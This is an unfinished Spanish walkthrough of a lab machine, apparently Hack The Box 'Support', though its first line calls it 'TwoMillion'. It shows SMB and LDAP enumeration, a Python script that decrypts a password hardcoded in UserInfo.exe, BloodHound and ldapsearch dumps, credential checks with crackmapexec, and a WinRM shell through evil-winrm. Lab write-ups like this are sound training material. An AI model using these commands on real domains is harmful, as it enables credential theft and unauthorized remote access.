---

---
----
- Tags: #Windows #LDAP
***
Vamos a resolver la máquina TwoMillion. 
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.11.174`

### 1. Enumeración

Al hacer un escaneo inicial con nmap de puertos abiertos, vemos que están corriendo los puertos de [[SMB - Server Message Block]] (135,139,445) y de LDAP (389,3268,3269). 

```bash
Nmap scan report for 10.10.11.174
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 15:46:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-18T15:46:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

No obtenemos demasiada información con `nmap`, así que sabiendo que tenemos habilitado SMB y LDAP continuamos la enumeración por ahí. Hay que revisar si o sí lo siguiente:

- **SMB** – Buscar comparticiones abiertas y ver qué se puede encontrar ahí.    
- **LDAP** – ¿Puedo obtener información sin credenciales?    

**Si eso falla:**
- **Kerberos** – ¿Puedo hacer fuerza bruta para sacar usuarios? Si encuentro alguno, ¿es vulnerable a AS-REP Roasting?    
- **DNS** – ¿Puedo hacer una transferencia de zona? ¿Fuerza bruta de subdominios?    
- **RPC** – ¿Se permite acceso anónimo?    

**Nota sobre credenciales:**
- **WinRM** – Si consigo credenciales de un usuario que esté en el grupo de _Remote Management Users_, puedo sacar una shell.

### 2. Foothold

Lo primero será comprobar si hay shares abiertos con `smbclient -L`:

> *La opción `-L` es para indicar que queremos obtener una lista de shares disponibles*

```shell--session
❯ smbclient -L \\\\10.10.11.174\\
Password for [WORKGROUP\alejo]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Comprobamos que el share `support-tools` no es un share por defecto, así que de nuevo, con smbclient entramos a dicho share:

```
❯ smbclient \\\\10.10.11.174\\support-tools
Password for [WORKGROUP\alejo]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 969846 blocks available
smb: \> 
```

Llama la atención el archivo `UserInfo.exe.zip`. Lo descargamos a local con `get` y salimos de smbclient. Lo descomprimimos y analizamos el binario con cualquier programa, en mi caso he usado [dnSpy](https://dnspy.org) . Simplemente abrimos el programa y cargamos el `.exe`. Tras navegar un poco, encontramos una información muy interesante:

![[Support_2.png]]

De aquí podemos sacar que carga una contraseña y entonces se conecta a LDAP con el usuario SUPPORT\ldap y dicha contraseña. Si buscamos en `Protected.getPassword()` obtenemos esta información:

![[Support_1.png]]

Tenemos una contraseña encriptada con el valor `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`. Podemos crear un script en Python para desencriptarla, en función de lo que hemos visto en el código del programa:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)
print(res)
```

Obtenemos la contraseña desencriptada, que es `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. A partir de aquí, ya que hemos obtenido una credencial de Windows, usamos Bloodhound. Como no tenemos una shell, usamos la versión de Python:

```bash
❯ bloodhound-python -c ALL -u ldap -p $(cat decrypted.txt) -d support.htb -ns 10.10.11.174
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 07S
```

Explicación de los parámetros:

|Parámetro|Significado|
|---|---|
|`-c ALL`|Ejecuta **todas las técnicas de colección disponibles**. Es equivalente a hacer `--collection-method All`.|
|`-u ldap`|Nombre de usuario del dominio. En este caso, el usuario es `ldap`.|
|`-p $(cat decrypted.txt)`|Contraseña del usuario. Aquí se extrae automáticamente del fichero `decrypted.txt`.|
|`-d support.htb`|Nombre del **dominio** al que se conecta.|
|`-ns 10.10.11.174`|IP del **servidor DNS** del dominio. Es necesaria para resolver nombres dentro del dominio.|

> *Hemos metido la IP de la máquina en el archivo `/etc/hosts` con el dominio `support.htb`*

El siguiente paso es usar `ldapsearch` para mostrar todos los items en el directorio activo, con el siguiente comando:

```bash
ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

|Parámetro|Significado|
|---|---|
|`ldapsearch`|Herramienta de línea de comandos para consultar servidores LDAP.|
|`-H ldap://support.htb`|Especifica el **host y el protocolo** (`ldap://`) al que conectar. Aquí, el servidor LDAP es `support.htb`.|
|`-D ldap@support.htb`|**Distinguished Name** (DN) del usuario con el que te autenticas. En este caso, es el usuario `ldap@support.htb`.|
|`-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'`|Contraseña del usuario anterior.|
|`-b "dc=support,dc=htb"`|**Base DN**, o raíz desde donde empieza la búsqueda LDAP. Aquí se busca desde el dominio `support.htb`.|
|`"*"`|Filtro de búsqueda. El asterisco significa **“devuélveme todo”** (todas las entradas del directorio).|
Nos va a devolver muchísima información, pero llama la atención el campo `info`, que tiene el valor `Ironside47pleasure40Watchful`, pues parece una contraseña- Con el comando `ldapdomaindump` también obtenemos la misma información.

```bash
ldapdomaindump -u support.htb\\ldap -p $(cat decrypted.txt) support.htb -o ldap
```

Según la información provista por Bloodhound, vemos que hay un miembro del grupo de usuarios de RDP. Lo confirmamos con crackmapexec:

```bash
❯ crackmapexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful' 2>/dev/null
SMB         support.htb     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
HTTP        support.htb     5985   DC               [*] http://support.htb:5985/wsman
WINRM       support.htb     5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Podemos conectarnos con `evil-winrm` para obtener una shell:

```bash
❯ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

...SNIP...

*Evil-WinRM* PS C:\Users\support\Documents> 
```

### 3. Escalada de privilegios

PENDIENTE